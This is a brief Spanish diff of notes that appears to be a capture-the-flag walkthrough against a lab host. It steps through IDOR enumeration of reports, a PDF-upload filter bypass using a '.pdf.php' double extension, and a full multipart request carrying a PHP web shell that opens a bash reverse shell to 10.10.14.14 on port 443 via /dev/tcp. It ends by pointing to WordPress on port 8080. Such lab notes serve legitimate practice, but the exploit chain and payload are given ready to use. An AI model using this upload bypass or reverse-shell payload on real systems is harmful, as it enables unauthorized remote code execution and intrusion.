@@ -1,0 +1,22 @@
+
+1. IDOR para llegar a: (http://10.10.11.173/reports.php?report=x / x [0, 10000])
+    http://10.10.11.173/reports.php?report=9798
+    =>  http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/
+
+2. IDOR para hashes, utiliza el script.py y que genere los logs pdf y ahi nos toparemos con: /logs/report_log_upload.php 
+
+3. File Upload en: /logs/uploads/prueba_5.pdf
+
+    Subelo shell.php.pdf y no toques el MIME y solo basta con dejar el header ojo ahi
+
+-----------------------------200854366536327454791460963849
+Content-Disposition: form-data; name="pdfFile"; filename="prueba_31.pdf.php"
+Content-Type: application/pdf
+
+%PDF-1.5
+%µí®û
+4 0 obj
+
+<?php echo fread(popen("bash -c '/bin/bash -l > /dev/tcp/10.10.14.14/443 0<&1 2>&1'", "r"), 4096); ?>
+
+4. El puerto 8080 es wordpress ahora toca ir ahi
